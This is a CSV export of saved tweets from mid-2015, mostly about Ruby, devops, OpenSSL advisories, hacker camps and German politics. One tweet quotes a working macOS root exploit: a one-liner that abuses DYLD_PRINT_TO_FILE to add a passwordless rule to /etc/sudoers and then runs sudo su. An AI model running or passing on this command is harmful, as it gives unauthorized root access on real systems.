用户ID,服务ID,时间,内容,转推,喜欢,回复,URL
Holger,Twitter,上午2:46 - 2015年8月4日,"Holger Just 的 Twitter: “If you want to know when your remote coworkers are available, http://t.co/Dh1V3RjUjl is awesome with a clean and obvious UI. #StuffThatWorks”",0,,,https://twitter.com/meineerde/status/628502256791461888
Holger,Twitter,下午1:30 - 2015年7月30日,🤦🏼‍♂️ 的 Twitter: “This. http://t.co/2LckS1qK7x #Neulandesverrat”,0,1,4,https://twitter.com/fholzhauer/status/626852294680813568
Holger,Twitter,下午3:41 - 2015年8月10日,"Jeff Atwood 的 Twitter: “the hamburger menu is not ideal, but neither is 50 things shown on screen, of which users only ever click on 3  http://t.co/fY3LGzyKMV”",0,105,16,https://twitter.com/codinghorror/status/630871496609521664
Holger,Twitter,下午1:41 - 2015年8月15日,Holger Just 的 Twitter: “@krono Gras stresst. Aber muss… #ccamp2015”,0,,1,https://twitter.com/meineerde/status/632653322500079616
Holger,Twitter,下午8:14 - 2015年8月6日,Frank Denis 的 Twitter: “Mozilla Foundation Security Advisory 2015-78 - Same origin violation and local file stealing via PDF reader https://t.co/QXn5mIiEvN”,0,4,15,https://twitter.com/jedisct1/status/629490772908318720
Holger,Twitter,上午9:08 - 2015年8月10日,Holger Just 的 Twitter: “Was called an SJW for the first time today. Do I get a badge or something?”,0,,,https://twitter.com/meineerde/status/630772605126090752
Holger,Twitter,上午10:25 - 2015年7月30日,Lobsters 的 Twitter: “Ode to Sequel&#10;http://t.co/zM6iCtdzt6&#10;https://t.co/mDlwjZpv43 #databases #programming #ruby”,0,3,4,https://twitter.com/lobsters/status/626805782902759424
Holger,Twitter,下午7:32 - 2015年8月6日,Gose in the Shell 的 Twitter: “trump&#39;s america is gonna rule http://t.co/YUJDzTki6j”,0,124,4,https://twitter.com/moonpolysoft/status/629480114267422720
Holger,Twitter,下午12:28 - 2015年8月8日,Nadine Roßa 的 Twitter: “Read: »Auch ich bin ein Flüchtling« von @TOLLABEA http://t.co/KEbJ0VgrJz”,0,1,4,https://twitter.com/nadrosia/status/630098355335614464
Holger,Twitter,下午1:04 - 2015年8月15日,Holger Just 的 Twitter: “@apfelfabrik :(”,0,,1,https://twitter.com/meineerde/status/632643928806789120
Holger,Twitter,上午2:25 - 2015年8月4日,Planio 的 Twitter: “Interested in learning more about project management but don&#39;t feel like attending boring lectures? http://t.co/0G8kUuTHxi #pmot”,0,8,5,https://twitter.com/planio/status/628497002934988800
Holger,Twitter,上午6:30 - 2015年8月14日,Joseph Hurtado 的 Twitter: “Happy Friday everyone! Here is some Project Management humor shared by a good friend. #humor #agile #pmp http://t.co/SICMzlKATX”,0,340,2,https://twitter.com/josephhurtado/status/632182461263388672
Holger,Twitter,下午12:51 - 2015年8月6日,FF Hamburg 的 Twitter: “Gegenwärtig: Großeinsatz (TH4R) in Billbrook. Es kam zu einem Chemieunfall mit austretenden Gasen. Bitte Fenster und Türen schließen!”,0,41,2,https://twitter.com/ff_hamburg/status/629379242908852225
Holger,Twitter,上午12:51 - 2015年8月5日,"Patrick McKenzie 的 Twitter: “PSA for devs: $100k is below Valley entry level salaries, $250k is high-side-of-median for 30 year old, $500k achievable at AmaGooFaceSoft.”",0,454,51,https://twitter.com/patio11/status/628835817046183936
Holger,Twitter,上午4:03 - 2015年8月1日,"Planio 的 Twitter: “Stay hydrated! / Denkt an die Elektrolyte! Viel Spaß, dear @eurucamp-ers from your friends at @Planio. http://t.co/ESmspdx3Ga”",0,10,1,https://twitter.com/planio/status/627434381490171906
Holger,Twitter,上午4:40 - 2015年7月29日,Holger Just 的 Twitter: “Alles Zweifelhafte muss angezweifelt werden.”,0,,,https://twitter.com/meineerde/status/626356664451624960
Holger,Twitter,上午3:50 - 2015年8月1日,Holger Just 的 Twitter: “@medk_ @eurucamp Thank you. That was easy &lt;3”,0,,1,https://twitter.com/meineerde/status/627431244972822528
Holger,Twitter,下午3:46 - 2015年8月6日,"Holger Just 的 Twitter: “Dear Hamburg friends, please be safe! https://t.co/lJunXDJsk4 @flix”",0,1,1,https://twitter.com/meineerde/status/629423376407363584
Holger,Twitter,上午1:58 - 2015年8月15日,"Jan 的 Twitter: “This article, a million times this article! Pretty much our story at @planio and so, so true. #bootstrapping #novc https://t.co/bJuZf87aC5”",0,1,5,https://twitter.com/jan/status/632476335907188736
Holger,Twitter,下午12:54 - 2015年8月6日,power_assert 的 Twitter: “Someone changed plans and doesn&#39;t want to go to #cccamp? I&#39;m looking for a ticket”,0,2,2,https://twitter.com/janlelis/status/629379990853918720
Holger,Twitter,上午1:01 - 2015年8月1日,"Holger Just 的 Twitter: “@eurucamp Is there any way to use the university wifi, i.e. do you have any vouchers for the UP-Conference wifi?”",0,,1,https://twitter.com/meineerde/status/627388744635707392
Holger,Twitter,下午8:12 - 2015年6月9日,Wesley David 的 Twitter: “Whenever I see install instructions that start with curling a file into bash. #sysadmin #devops http://t.co/0sw5iJPopq”,0,548,38,https://twitter.com/nonapeptide/status/608471679103148032
Holger,Twitter,下午1:15 - 2015年8月14日,PHP CEO 的 Twitter: “THANK GOD ITS FRIDAY AND ALL THE HACKERS HAVE GONE HOME FOR THE WEEKEND”,0,110,4,https://twitter.com/php_ceo/status/632284434927108096
Holger,Twitter,下午2:58 - 2015年7月31日,"Holger Just 的 Twitter: “And just before the day ends: Opshugs to all sysadmins, developers and devops people. Thank you for keeping the lights on. #SysadminDay”",0,,1,https://twitter.com/meineerde/status/627236951750524928
Holger,Twitter,下午7:03 - 2015年8月13日,"Andrew Pouliot 的 Twitter: “Update yer Macs, folks ;)&#10;https://t.co/BBjtNyLIGj”",0,7,1,https://twitter.com/andpoul/status/632009674062082048
Holger,Twitter,上午1:26 - 2015年7月27日,Nadine Roßa 的 Twitter: “Ich habe ein paar Gedanken aufgeschrieben ☞&#10;Über den Wert von Designleistungen http://t.co/FrZewih5fo #vorletztertweet”,0,6,2,https://twitter.com/nadrosia/status/625582951535898625
Holger,Twitter,上午2:16 - 2015年6月9日,Studentenleben 的 Twitter: “Als fast fertig studierter Soziologe gebe ich Ihnen hiermit den einzig wichtigen Überlebenstipp:&#10;&#10;Halten Sie sich von Menschen fern.”,0,"4,976",57,https://twitter.com/tomkraftwerk/status/608200948645789696
Holger,Twitter,下午1:05 - 2015年7月26日,"Raul Krauthausen 的 Twitter: “Es gibt nur eine Sache, die schlimmer ist, als Nazis vor Flüchtlingsheimen:&#10;Politiker, die Verständnis für die sog. besorgten Bürger haben”",0,608,21,https://twitter.com/raulde/status/625396560264826880
Holger,Twitter,上午4:28 - 2015年7月20日,"Roma Komarov 的 Twitter: “Quick idea for code editors &amp; CSS preprocessors (Sass, Stylus): parent selectors as sticky headers — https://t.co/HRA0BBZSoD”",0,122,10,https://twitter.com/kizmarh/status/623092017992761344
Holger,Twitter,下午3:18 - 2015年7月10日,"ugh 的 Twitter: “Anyway, just a small reminder from them to you that we live in a weird fucking bubble. And there are other bubbles out there.”",0,12,1,https://twitter.com/steveklabnik/status/619631746590633984
Holger,Twitter,上午10:05 - 2015年7月10日,Holger Just 的 Twitter: “@quittingquince *HURK* 😩😨😶😣😷”,0,1,1,https://twitter.com/meineerde/status/619552918207864832
Holger,Twitter,上午3:28 - 2015年7月10日,Holger Just 的 Twitter: “@Argorak Discover view (i.e. the original view of Kibana) should help. https://t.co/S0VCBdXBKu”,0,,1,https://twitter.com/meineerde/status/619453143336792064
Holger,Twitter,下午10:18 - 2015年7月21日,"Stefan Esser 的 Twitter: “echo python -c &#39;import os;os.write(3,\ALL ALL=(ALL) NOPASSWD: ALL\)&#39;|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su # via reddit lsdhobo”",0,252,5,https://twitter.com/i0n1c/status/623723662898823168
Holger,Twitter,下午3:17 - 2015年7月10日,ugh 的 Twitter: “You&#39;re telling me that all the black employees of the biggest tech companies fit on a single plane?”,0,11,1,https://twitter.com/steveklabnik/status/619631548514627585
Holger,Twitter,上午3:15 - 2015年7月10日,Holger Just 的 Twitter: “@PragTob @rug_b First I assumed they scraped the website for email addresses but now I’m certain they used the mailing list :(”,0,,1,https://twitter.com/meineerde/status/619449897176141824
Holger,Twitter,上午9:24 - 2015年7月25日,Sandi Vincent 的 Twitter: “Brutalist sandcastles. http://t.co/dktWBwjThw http://t.co/b8mWI8aXtx”,0,"1,248",25,https://twitter.com/sandiv/status/624978414777167873
Holger,Twitter,上午9:03 - 2015年7月10日,Holger Just 的 Twitter: “@quittingquince Wir hatten mal eine Gesangsgruppe ab Stralsund dabei. Das war schlimm. Saufende Frauen UND schlechter Gesang…”,0,2,1,https://twitter.com/meineerde/status/619537504631410688
Holger,Twitter,上午12:06 - 2015年7月20日,Alec Muffett 的 Twitter: “Computer Programming To Be Officially Renamed “Googling Stackoverflow” http://t.co/BlcKD2ykpt”,0,664,24,https://twitter.com/alecmuffett/status/623026074927165440
Holger,Twitter,下午3:16 - 2015年7月10日,ugh 的 Twitter: “Wait so when a code of conduct was going to be introduced someone actually said who can even decide what&#39;s racist?”,0,21,4,https://twitter.com/steveklabnik/status/619631311850967041
Holger,Twitter,上午6:19 - 2015年7月10日,Frank Rieger 的 Twitter: “The #cccamp15 will be the first hacker event (afaik) that hands out a fully working Software Defined Radio as badge! https://t.co/mGzZk4gGum”,0,54,4,https://twitter.com/frank_rieger/status/619496070406668288
Holger,Twitter,下午3:15 - 2015年7月10日,"ugh 的 Twitter: “Wait, let me get this straight? Some guy got a swastika tattoo and enough people defend it that you can&#39;t just laugh them off? Wtf is wrong”",0,19,2,https://twitter.com/steveklabnik/status/619630963304345600
Holger,Twitter,下午1:23 - 2015年7月9日,Cheatha 的 Twitter: “Warum Motorradfahrer sinnlos überholen: http://t.co/FA6oyzaBQw”,0,14,3,https://twitter.com/cheatha/status/619240514089410561
Holger,Twitter,上午5:38 - 2015年7月10日,"Holger Just 的 Twitter: “@Hagenburger That’s true. So in the end, I still think they used the mailing list. Although I couldn’t get a raw member mail list on 1st try”",0,,,https://twitter.com/meineerde/status/619485811407458304
Holger,Twitter,下午2:35 - 2015年7月18日,Mike Monteiro 的 Twitter: “We don’t need driverless cars. We need carless humans.”,0,"1,174",51,https://twitter.com/monteiro/status/622520136709242880
Holger,Twitter,下午10:17 - 2015年7月25日,the grugq 的 Twitter: “Do not use SureSpot. It has been backdoored/broken to facilitate monitoring. I have received confirmation of this: https://t.co/LlffyxEMy3”,0,186,17,https://twitter.com/thegrugq/status/625173052783853568
Holger,Twitter,下午11:06 - 2015年7月19日,Daniel Schultz 的 Twitter: “Sterbende Dörfer - Fest in rechter Hand http://t.co/MUZXgN1hGp”,0,10,2,https://twitter.com/presseschauer/status/623011035176411136
Holger,Twitter,上午10:18 - 2015年7月23日,"Gose in the Shell 的 Twitter: “In the land of macbooks, the guy with the lenovo is the hipster.”",0,104,13,https://twitter.com/moonpolysoft/status/624267390650462212
Holger,Twitter,下午3:13 - 2015年7月10日,ugh 的 Twitter: “Yeah lately I&#39;ve mostly been arguing with other programmers if literal fascists deserve to be protected in our communities&#10;&#10;*blank stares*”,0,41,5,https://twitter.com/steveklabnik/status/619630615508459520
Holger,Twitter,上午5:19 - 2015年7月10日,"Holger Just 的 Twitter: “@Hagenburger @PragTob @plexus It’s visible in the git patches, e.g. https://t.co/IutdevbWhS”",0,,2,https://twitter.com/meineerde/status/619481117788381184
Holger,Twitter,下午2:47 - 2015年7月9日,"Till 的 Twitter: “Don’t worry, nothing will break.&#10;They said.”",0,1,2,https://twitter.com/klimpong/status/619261524201340928
Holger,Twitter,上午8:15 - 2015年7月19日,Planio 的 Twitter: “Helping @SoftwareAG today with major migration of in-house @Planio. Going very smoothly. Great collaboration with their staff! #enterprise”,0,5,2,https://twitter.com/planio/status/622786822192672768
Holger,Twitter,下午3:11 - 2015年7月10日,"ugh 的 Twitter: “Reminder: sincerity doesn&#39;t matter. If your trolling reproduces attitudes and behaviors, you&#39;ve still reproduced them. Same as if sincere.”",0,65,3,https://twitter.com/steveklabnik/status/619630095658012672
Holger,Twitter,上午11:24 - 2015年7月9日,Jacob Appelbaum 的 Twitter: “Hilariously meta: https://t.co/YS4HW4VtIR”,0,36,3,https://twitter.com/ioerror/status/619210628473995264
Holger,Twitter,下午2:20 - 2015年7月10日,Marcel Wichmann 的 Twitter: “Whoa. http://t.co/Nvz5cCt6Fv”,0,,1,https://twitter.com/uarrr/status/619617282856255489
Holger,Twitter,上午3:37 - 2015年7月10日,"Holger Just 的 Twitter: “@PragTob @rug_b Not a problem :) In the end, they shot themselves into their own foot. Thanks for handling this! &lt;3”",0,,,https://twitter.com/meineerde/status/619455292309393408
Holger,Twitter,上午9:23 - 2015年7月22日,"Miel 的 Twitter: “Nichts zu sagen bedeutet, diese … Attentate als Teil unserer Alltagskultur zu legitimieren.— http://t.co/VlxpLDCRtk http://t.co/hJGLtjjBQM”",0,16,24,https://twitter.com/_miel/status/623891179302686721
Holger,Twitter,下午1:11 - 2015年7月10日,Zeldman 的 Twitter: “Bad news for icon fonts: they present accessibility issues for people with dyslexia. #ally&#10;&#10;http://t.co/rxL579NXfG http://t.co/Ax4xogYOeh”,0,66,5,https://twitter.com/zeldman/status/619599738145386496
Holger,Twitter,上午3:36 - 2015年7月10日,"Holger Just 的 Twitter: “@PragTob On the other hand, it could be they scraped the addresses from Github commits. There, I also sometms use the email I use on the ML.”",0,,,https://twitter.com/meineerde/status/619455054953758720
Holger,Twitter,下午12:03 - 2015年7月10日,"Jeff Atwood 的 Twitter: “Yet again, wasting our team&#39;s time with vulnerability bounty reports that were not verified at all. http://t.co/7aTckQPYBo”",0,19,1,https://twitter.com/codinghorror/status/619582830511697920
Holger,Twitter,上午3:34 - 2015年7月10日,"Holger Just 的 Twitter: “@PragTob It might be possible that I used my private address in rug-b.de sometime in the past, but I doubt it…”",0,,1,https://twitter.com/meineerde/status/619454598491848704
Holger,Twitter,上午7:30 - 2015年7月13日,Chris Siebenmann 的 Twitter: “Today I discovered Mozilla&#39;s security guideline for OpenSSH configuration; it&#39;s interesting reading. https://t.co/spyFMdcC3h”,0,11,2,https://twitter.com/thatcks/status/620601292327677952
Holger,Twitter,上午6:56 - 2015年1月11日,Vance Crowe 的 Twitter: “That surprised look when you show someone that broccoli didn&#39;t occur naturally humans bred it from wild mustard http://t.co/84KEFqIusb”,0,"5,717",468,https://twitter.com/vancecrowe/status/554290735030075393
Holger,Twitter,上午8:59 - 2015年7月22日,JRuby Dev Team 的 Twitter: “JRuby 9.0.0.0 has been released.  Major release == Major fun!&#10;http://t.co/HBJI6D3gTy”,0,107,11,https://twitter.com/jruby/status/623885086010650625
Holger,Twitter,上午7:25 - 2015年7月9日,"Lincoln Stoll 的 Twitter: “If you&#39;ve got `OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE` in your app, you don&#39;t need to update openssl https://t.co/DJpI2c5Wb7✓”",0,28,3,https://twitter.com/lstoll/status/619150454132482048
Holger,Twitter,上午9:23 - 2015年7月10日,CCC Updates 的 Twitter: “#CCCamp15 Design \o/ https://t.co/wAs9eOigoJ”,0,19,5,https://twitter.com/chaosupdates/status/619542509375631362
Holger,Twitter,下午12:03 - 2015年7月16日,"Jan Schaumann 的 Twitter: “Y&#39;all did see this http://t.co/bM2NrKoHsW thing, right? RC4 broken in 52 hours.”",0,18,2,https://twitter.com/jschauma/status/621757051979567105
Holger,Twitter,上午3:33 - 2015年7月10日,"Holger Just 的 Twitter: “@PragTob @rug_b I use different email addresses on github, twitter and the mailing list. They wrote to the address I use on the ML only.”",0,1,1,https://twitter.com/meineerde/status/619454389149937664
Holger,Twitter,上午5:48 - 2015年7月9日,"Mark J Cox 的 Twitter: “OpenSSL updates out, CVE-2015-1793 high severity certificate flaw affects releases since June 2015 only.  https://t.co/FYfiAm1Noo”",0,21,3,https://twitter.com/iamamoose/status/619125994956431361
Holger,Twitter,上午3:32 - 2015年7月10日,Holger Just 的 Twitter: “@Argorak I’m afraid I’m not of real help then as we are still on a rather ancient version of Kibana which has is mostly just Discovery mode.”,0,,1,https://twitter.com/meineerde/status/619454036106956800
Holger,Twitter,上午3:51 - 2015年7月16日,Holger Just 的 Twitter: “@Hagenburger Just read through my twitter backlog. I’m glad you are okay!”,0,1,1,https://twitter.com/meineerde/status/621633316907782144
Holger,Twitter,上午10:33 - 2015年7月21日,Zeldman 的 Twitter: “What that semicolon tattoo is all about. #ProjectSemicolon http://t.co/fjJxuJbdpH http://t.co/Wscl40t4jL”,0,33,10,https://twitter.com/zeldman/status/623546251280314368
Holger,Twitter,下午2:29 - 2015年7月11日,"Anne Roth 的 Twitter: “Dear Greeks, dear Greece, dear Europeans, everybody: we apologize for the inacceptable, and stupid, behaviour of our government.”",0,204,9,https://twitter.com/anne_roth/status/619981963441508352
Holger,Twitter,上午3:57 - 2015年7月9日,Holger Just 的 Twitter: “@ihsandogan Besser mit Vorwarnung als mit einem überhasteten Notfall-Release. Dadurch können sich alle (auch Distrib.) darauf vorbereiten.”,0,1,1,https://twitter.com/meineerde/status/619098143045591040
Holger,Twitter,上午10:08 - 2015年7月9日,HePo 的 Twitter: “Higher helmet use shouldn’t be a goal.An increase in helmets is a sign that the city has failed miserably  to provide safe streets.”,,27,1,https://twitter.com/hepofi/status/619191383472087041
Holger,Twitter,上午1:24 - 2015年7月9日,"Mark J Cox 的 Twitter: “If you are waiting for the OpenSSL announcement today, expect it sometime late morning-early afternoon UK time; if all goes well”",0,9,4,https://twitter.com/iamamoose/status/619059583923916800
Holger,Twitter,上午8:16 - 2015年7月21日,Sifter 的 Twitter: “Overwhelmed by your product&#39;s backlog? Get it under control with these simple tips: http://t.co/7WYfrwWgKj”,0,1,1,https://twitter.com/sifterapp/status/623511796020838400
Holger,Twitter,上午3:35 - 2015年7月20日,Sissi 的 Twitter: “♥ http://t.co/XzA6ZzwGZT”,0,6,3,https://twitter.com/zhavorsa/status/623078802588049409
Holger,Twitter,上午3:30 - 2015年7月9日,Holger Just 的 Twitter: “Waiting for Godot^WOpenSSL…”,0,,,https://twitter.com/meineerde/status/619091266962386944
Holger,Twitter,上午2:31 - 2015年7月7日,"Holger Just 的 Twitter: “@awendt So while the answer is valid (I have only glanced over the blog post), I think it can lead to unintended conseq. for unskilled ppl.”",0,,1,https://twitter.com/meineerde/status/618351497403858945
Holger,Twitter,上午11:39 - 2015年7月2日,Holger Just 的 Twitter: “Watching a Smalltalk talk at @rug_b and getting really weird flashbacks to Lively Kernel. I don’t think I can stand doing this again.”,0,,1,https://twitter.com/meineerde/status/616677540648890368
Holger,Twitter,上午2:29 - 2015年6月23日,Mildly Müd 的 Twitter: “@meineerde A sudden performance of Singin in the rain comes to mind to counter the awkward...”,0,,1,https://twitter.com/habidd/status/613277788586569728
Holger,Twitter,上午7:34 - 2015年6月19日,Holger Just 的 Twitter: “Todays useful SSH authorized_keys option: permitopen: Limit local ssh -L port forwarding [… to connect only] to the specified host and port”,0,,,https://twitter.com/meineerde/status/611904904010035200
Holger,Twitter,上午6:01 - 2015年7月8日,Avdi Grimm 的 Twitter: “Ruby is defined by terrible tools http://t.co/0qQc1aelkN”,0,122,26,https://twitter.com/avdi/status/618766753905033216
Holger,Twitter,上午2:39 - 2015年6月30日,"Holger Just 的 Twitter: “TIL: If random file uploads don’t seem to work on a website, try to disable your ad-blocker. It might think you are uploading ads.”",0,,,https://twitter.com/meineerde/status/615816914363744256
Holger,Twitter,上午2:49 - 2015年7月8日,"Holger Just 的 Twitter: “All software is broken. Although sometimes it seems to work, everything is still kaputt.”",0,2,1,https://twitter.com/meineerde/status/618718423351205888
Holger,Twitter,上午1:39 - 2015年6月23日,Holger Just 的 Twitter: “@vihaire But it would look really funny for innocent observers :)”,0,,,https://twitter.com/meineerde/status/613264991622430720
Holger,Twitter,下午3:58 - 2015年6月26日,Randi Lee Harper 的 Twitter: “This is a reminder that there&#39;s many sexual preferences. Don&#39;t erase people that aren&#39;t strictly gay. This was a victory for all.”,0,105,10,https://twitter.com/randileeharper/status/614568548866854916
Holger,Twitter,上午1:28 - 2015年7月8日,Holger Just 的 Twitter: “Der Morgen wird nett mit Mett. #sorry #erstmalKaffee”,0,,,https://twitter.com/meineerde/status/618698270672601088
Holger,Twitter,上午10:18 - 2015年6月25日,Holger Just 的 Twitter: “@Hlinim @Percona I’m seeing about 90% ping loss behind their own edge router/firewall. http://t.co/Yn0ibvraCu”,0,,1,https://twitter.com/meineerde/status/614120587515035648
Holger,Twitter,上午1:31 - 2015年6月23日,"Holger Just 的 Twitter: “Finally, @tommyc66 has the answer: the Queen visits Berlin today. Of course there is rain!”",0,,3,https://twitter.com/meineerde/status/613263032299470848
Holger,Twitter,上午2:29 - 2015年7月7日,Holger Just 的 Twitter: “@awendt What I meant was that performance discus. are unsuitable here. They just lead to odd code by people thinking “fast is always better””,0,,1,https://twitter.com/meineerde/status/618351026828128257
Holger,Twitter,上午2:08 - 2015年7月7日,"CriticalmassMuenchen 的 Twitter: “Der Fahrradfahrer trug keinen Helm... Was soll das, @PolizeiMuenchen?&#10;&#10;http://t.co/PWhoJRX0EL http://t.co/EnIMVIfmCB”",0,88,31,https://twitter.com/cm_muenchen/status/618345807444639744
Holger,Twitter,上午8:31 - 2015年7月6日,Mark J Cox 的 Twitter: “OpenSSL 1.0.2 and 1.0.1 updates out Thu fix a single high severity security issue.  1.0.0 and 0.9.8 not affected. https://t.co/LdaXaYnPCN”,0,7,1,https://twitter.com/iamamoose/status/618079886385750016
Holger,Twitter,上午2:40 - 2015年6月19日,Holger Just 的 Twitter: “MFW someone enters the Redmine IRC channel asking how to analyze data in a Trac database using plain SQL. http://t.co/F8pGuDPztf”,0,1,1,https://twitter.com/meineerde/status/611830841505902592
Holger,Twitter,下午12:15 - 2015年7月5日,"Meanwhile In Scotia 的 Twitter: “The bailout Greece needs, put in some context...&#10;#Greferendum http://t.co/95b49fWH5u”",0,"1,192",85,https://twitter.com/meanwhilescotia/status/617773804807393280
Holger,Twitter,上午9:58 - 2015年6月18日,A Dream Like an Echo 的 Twitter: “Great response from the team re transphobic committer: https://t.co/ZfIFt4XH5z http://t.co/U91C89pzaq”,0,31,14,https://twitter.com/coralineada/status/611578741307805696
Holger,Twitter,上午5:42 - 2015年7月7日,"Holger Just 的 Twitter: “And while you are at it, please also check your webserver’s TLS config. https://t.co/fb8E6vkaCO is a good start to actually be secure.”",0,,1,https://twitter.com/meineerde/status/618399663994109952
Holger,Twitter,上午1:31 - 2015年7月3日,"Nadine Roßa 的 Twitter: “Whoop, whoop! &#10;→ Look who started a little side project: http://t.co/lDBi6GvBiZ ✎♥ &#10;Go and spread the love! #sketchnotes #sketchnotelove”",0,29,5,https://twitter.com/nadrosia/status/616886993453228032
Holger,Twitter,上午1:26 - 2015年6月23日,Holger Just 的 Twitter: “@krono You mean like https://t.co/xa6ro0RLRG ?”,0,,1,https://twitter.com/meineerde/status/613261864328392704
Holger,Twitter,上午6:07 - 2015年6月14日,Jan 的 Twitter: “Feels awesome knowing that things like complete core database failovers just work. Great to have a DevOps guru like @meineerde on the team!”,0,7,2,https://twitter.com/jan/status/610071119622729728
Holger,Twitter,上午5:39 - 2015年7月7日,"Holger Just 的 Twitter: “On Thursday, there’ll be an OpenSSL release fixing a high severity vuln. Please pre-warm your upgrade engines now. https://t.co/XMjxDLRPsN”",0,,1,https://twitter.com/meineerde/status/618398961406222336
Holger,Twitter,上午1:25 - 2015年6月23日,Holger Just 的 Twitter: “@vihaire But both variants feel somehow awkward. The only proper solution is probably to just not use an umbrella at all.”,0,,1,https://twitter.com/meineerde/status/613261537738932224
Holger,Twitter,上午10:12 - 2015年6月25日,"Holger Just 的 Twitter: “@Hlinim As I wrote my tweet, the main site was still fine, now it’s down too. Looks like some edge network FU or DoS going on… /cc @Percona”",0,,1,https://twitter.com/meineerde/status/614118952319459330
Holger,Twitter,上午4:23 - 2015年7月7日,Holger Just 的 Twitter: “Current CO/LUNCH status at @LAUNCH_CO http://t.co/bw0y6BtArE”,0,1,2,https://twitter.com/meineerde/status/618379800802140160
Holger,Twitter,上午6:00 - 2015年7月2日,"Alex Lemm 的 Twitter: “@jan Haben leider wenig gemein mit den 4 Sch des derzeitigen Büroalltags: Schwitzen, Schaffen, Schreiben, Schwitzen (Wdh. durchaus gewollt)”",0,,1,https://twitter.com/alex23lemm/status/616592291797581824
Holger,Twitter,上午3:12 - 2015年6月12日,Matt 的 Twitter: “Wondering what&#39;s happening to the internet? AS4788 is leaking routes and Level3 (AS3549) is accepting and propagating them perpetually.”,0,17,5,https://twitter.com/mattsalsamendi/status/609302233369329664
Holger,Twitter,上午2:13 - 2015年7月7日,"André “Andr�” Wendt 的 Twitter: “„Wer Überwachung, Online-Durchsuchung, Datenspeicherung nicht will, kann sich ja zu Hause hinter&#39;m Ofen verkriechen“ http://t.co/7f46lxjGEx”",0,,1,https://twitter.com/awendt/status/618347098036158464
Holger,Twitter,上午9:59 - 2015年6月25日,Holger Just 的 Twitter: “@percona http://t.co/aUyTo18ZcG seems to be down from here. Can you fix that? &lt;3 #opshug”,0,1,1,https://twitter.com/meineerde/status/614115609832460288
Holger,Twitter,上午2:32 - 2015年7月7日,Holger Just 的 Twitter: “@awendt (And just to be clear here: the downvote wasn’t from me and was uncalled for imho.)”,0,,1,https://twitter.com/meineerde/status/618351942197215232
Holger,Twitter,上午1:24 - 2015年6月23日,Holger Just 的 Twitter: “@vihaire The guy before me just continued walking. I folded it up and held it awkwardly until the tunnel ended like 50 meters after…”,0,,,https://twitter.com/meineerde/status/613261273350991872
Holger,Twitter,上午5:09 - 2015年7月2日,"Jan 的 Twitter: “Für Sie rescherschiert: Die 4 Schs des Urlaubs - Schlafen, Schwimmen, Schlemmen und Schillen #gerngeschehen”",0,2,3,https://twitter.com/jan/status/616579343989518336
Holger,Twitter,上午3:33 - 2015年6月12日,Holger Just 的 Twitter: “Great to see that @TMCorp has a good time while they break the internet.”,0,,,https://twitter.com/meineerde/status/609307634462797824
Holger,Twitter,下午11:58 - 2015年7月2日,Holger Just 的 Twitter: “Leben hat euch wieder.&#10;Und der Kapitalismus auch.&#10;&#10;http://t.co/yDC5qUcAYR”,0,1,1,https://twitter.com/meineerde/status/616863584354635778
Holger,Twitter,下午6:15 - 2015年6月11日,Telekom Malaysia 的 Twitter: “Goooood morning Malaysia! http://t.co/DMiGfnUW3e”,0,103,48,https://twitter.com/tmcorp/status/609167065300271104
Holger,Twitter,下午4:09 - 2015年7月1日,dadpool 的 Twitter: “Fuck…. http://t.co/uMdw3BgyS4”,0,52,7,https://twitter.com/lusis/status/616383236646768640
Holger,Twitter,上午1:12 - 2015年6月23日,Holger Just 的 Twitter: “It’s raining. You are walking under an umbrella. A pedestrian tunnel approaches. What do you do?”,0,,3,https://twitter.com/meineerde/status/613258338546135040
Holger,Twitter,上午7:46 - 2015年6月11日,Rem0te 的 Twitter: “Eventually shit is about to hit the fan. Again. #SSL http://t.co/hvKSKYMjDZ”,0,9,12,https://twitter.com/grauhut/status/609008787052224512
Holger,Twitter,下午1:55 - 2015年7月1日,ugh 的 Twitter: “45 / 181 = .248 = once every four days https://t.co/kLBdG5bQYG”,0,,7,https://twitter.com/steveklabnik/status/616349524001488897
Holger,Twitter,上午10:09 - 2015年6月24日,Phil Calçado 的 Twitter: “Typical Optometrist on Berlin. http://t.co/4QzEQxP0nK”,0,17,1,https://twitter.com/pcalcado/status/613755714436222976
Holger,Twitter,上午3:47 - 2015年6月11日,Holger Just 的 Twitter: “It&#39;s the future http://t.co/Dz7mo4fFte”,0,,,https://twitter.com/meineerde/status/608948584952770560
Holger,Twitter,下午12:17 - 2015年6月23日,C3 Infodesk 的 Twitter: “FAQ #1: No tickets yet”,0,20,3,https://twitter.com/c3infodesk/status/613425623768387584
